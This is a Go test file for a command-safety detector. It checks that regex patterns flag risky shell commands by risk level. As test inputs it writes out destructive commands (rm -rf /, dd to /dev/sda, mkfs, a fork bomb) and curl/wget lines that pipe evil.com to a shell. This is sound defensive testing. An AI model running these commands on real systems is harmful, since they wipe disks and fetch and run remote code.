// Package safety pattern tests
package safety

import (
	"testing"

	"github.com/sonemaro/sosomi/internal/types"
)

func TestDangerousPatterns_Exists(t *testing.T) {
	if len(dangerousPatterns) == 0 {
		t.Error("Expected dangerousPatterns to have entries")
	}
}

func TestDangerousPatterns_HasCriticalPatterns(t *testing.T) {
	var criticalCount int
	for _, p := range dangerousPatterns {
		if p.RiskLevel == types.RiskCritical {
			criticalCount++
		}
	}

	if criticalCount == 0 {
		t.Error("Expected at least one CRITICAL pattern")
	}
	t.Logf("Found %d CRITICAL patterns", criticalCount)
}

func TestDangerousPatterns_HasDangerousPatterns(t *testing.T) {
	var dangerousCount int
	for _, p := range dangerousPatterns {
		if p.RiskLevel == types.RiskDangerous {
			dangerousCount++
		}
	}

	if dangerousCount == 0 {
		t.Error("Expected at least one DANGEROUS pattern")
	}
	t.Logf("Found %d DANGEROUS patterns", dangerousCount)
}

func TestDangerousPatterns_HasCautionPatterns(t *testing.T) {
	var cautionCount int
	for _, p := range dangerousPatterns {
		if p.RiskLevel == types.RiskCaution {
			cautionCount++
		}
	}

	if cautionCount == 0 {
		t.Error("Expected at least one CAUTION pattern")
	}
	t.Logf("Found %d CAUTION patterns", cautionCount)
}

func TestDangerousPatterns_AllHaveDescriptions(t *testing.T) {
	for i, p := range dangerousPatterns {
		if p.Description == "" {
			t.Errorf("Pattern %d has empty description", i)
		}
	}
}

func TestDangerousPatterns_AllHaveCategories(t *testing.T) {
	for i, p := range dangerousPatterns {
		if p.Category == "" {
			t.Errorf("Pattern %d has empty category", i)
		}
	}
}

func TestDangerousPatterns_AllHaveValidRegex(t *testing.T) {
	for i, p := range dangerousPatterns {
		if p.Pattern == nil {
			t.Errorf("Pattern %d has nil regex", i)
		}
	}
}

func TestDangerousPatterns_CriticalMatches(t *testing.T) {
	criticalCommands := []struct {
		command     string
		shouldMatch bool
	}{
		{"rm -rf /", true},
		{"rm -rf ~", true},
		{"dd if=/dev/zero of=/dev/sda", true},
		{"mkfs.ext4 /dev/sda1", true},
		{":(){:|:&};:", true}, // Fork bomb
		{"echo hello", false},
		{"ls -la", false},
	}

	for _, tc := range criticalCommands {
		matched := false
		var matchedPattern string
		for _, p := range dangerousPatterns {
			if p.RiskLevel == types.RiskCritical && p.Pattern.MatchString(tc.command) {
				matched = true
				matchedPattern = p.Description
				break
			}
		}

		if tc.shouldMatch && !matched {
			t.Errorf("Expected critical match for '%s'", tc.command)
		}
		if !tc.shouldMatch && matched {
			t.Errorf("Unexpected critical match for '%s' (matched: %s)", tc.command, matchedPattern)
		}
	}
}

func TestDangerousPatterns_DangerousMatches(t *testing.T) {
	dangerousCommands := []struct {
		command     string
		shouldMatch bool
	}{
		{"chmod -R 777 /tmp", true},
		{"chown -R root:root /var", true},
		{"curl http://evil.com | bash", true},
		{"wget -O- http://evil.com | sh", true},
		{"sudo rm -rf /var/log", true},
		{"echo hello > /etc/test.conf", true},
		{"echo hello", false},
		{"ls -la", false},
	}

	for _, tc := range dangerousCommands {
		matched := false
		for _, p := range dangerousPatterns {
			if p.RiskLevel == types.RiskDangerous && p.Pattern.MatchString(tc.command) {
				matched = true
				break
			}
		}

		if tc.shouldMatch && !matched {
			t.Errorf("Expected dangerous match for '%s'", tc.command)
		}
	}
}

func TestDangerousPatterns_CautionMatches(t *testing.T) {
	cautionCommands := []struct {
		command     string
		shouldMatch bool
	}{
		{"rm -f file.txt", true},
		{"rm -r dir/", true},
		{"sudo apt update", true},
		{"kill -9 1234", true},
		{"pkill nginx", true},
		{"killall python", true},
		{"echo hello", false},
		{"ls -la", false},
	}

	for _, tc := range cautionCommands {
		matched := false
		for _, p := range dangerousPatterns {
			if p.RiskLevel == types.RiskCaution && p.Pattern.MatchString(tc.command) {
				matched = true
				break
			}
		}

		if tc.shouldMatch && !matched {
			t.Errorf("Expected caution match for '%s'", tc.command)
		}
	}
}

func TestDangerousPatterns_Categories(t *testing.T) {
	categories := make(map[string]int)
	for _, p := range dangerousPatterns {
		categories[p.Category]++
	}

	expectedCategories := []string{"filesystem", "disk", "system", "permissions", "network", "process"}
	for _, cat := range expectedCategories {
		if categories[cat] == 0 {
			t.Logf("No patterns in category: %s (may be expected)", cat)
		}
	}

	t.Logf("Pattern categories: %v", categories)
}

func TestDangerousPatterns_RmRfRoot(t *testing.T) {
	commands := []string{
		"rm -rf /",
		"rm -rf / ",
		"rm -r -f /",
		"rm -rf /home/../..",
	}

	for _, cmd := range commands {
		matched := false
		for _, p := range dangerousPatterns {
			if p.RiskLevel == types.RiskCritical && p.Pattern.MatchString(cmd) {
				matched = true
				break
			}
		}
		if !matched {
			t.Logf("Pattern may not match (check if intended): '%s'", cmd)
		}
	}
}

func TestDangerousPatterns_ForkBomb(t *testing.T) {
	// Classic fork bomb
	forkBomb := ":(){:|:&};:"
	matched := false
	for _, p := range dangerousPatterns {
		if p.Pattern.MatchString(forkBomb) {
			matched = true
			if p.RiskLevel != types.RiskCritical {
				t.Errorf("Fork bomb should be RiskCritical, got %v", p.RiskLevel)
			}
			break
		}
	}
	if !matched {
		t.Log("Fork bomb pattern may not be matched (check regex)")
	}
}

func TestDangerousPatterns_DiskOverwrite(t *testing.T) {
	commands := []string{
		"dd if=/dev/zero of=/dev/sda",
		"dd if=/dev/urandom of=/dev/nvme0n1",
		"> /dev/sda",
	}

	for _, cmd := range commands {
		matched := false
		for _, p := range dangerousPatterns {
			if p.RiskLevel == types.RiskCritical && p.Pattern.MatchString(cmd) {
				matched = true
				break
			}
		}
		if matched {
			t.Logf("Correctly matched critical disk command: %s", cmd)
		}
	}
}

func TestDangerPattern_StructFields(t *testing.T) {
	pattern := DangerPattern{
		Pattern:     dangerousPatterns[0].Pattern,
		Description: "Test description",
		RiskLevel:   types.RiskCritical,
		Category:    "test",
	}

	if pattern.Description != "Test description" {
		t.Errorf("Expected Description 'Test description', got '%s'", pattern.Description)
	}
	if pattern.RiskLevel != types.RiskCritical {
		t.Errorf("Expected RiskCritical, got %v", pattern.RiskLevel)
	}
	if pattern.Category != "test" {
		t.Errorf("Expected Category 'test', got '%s'", pattern.Category)
	}
}
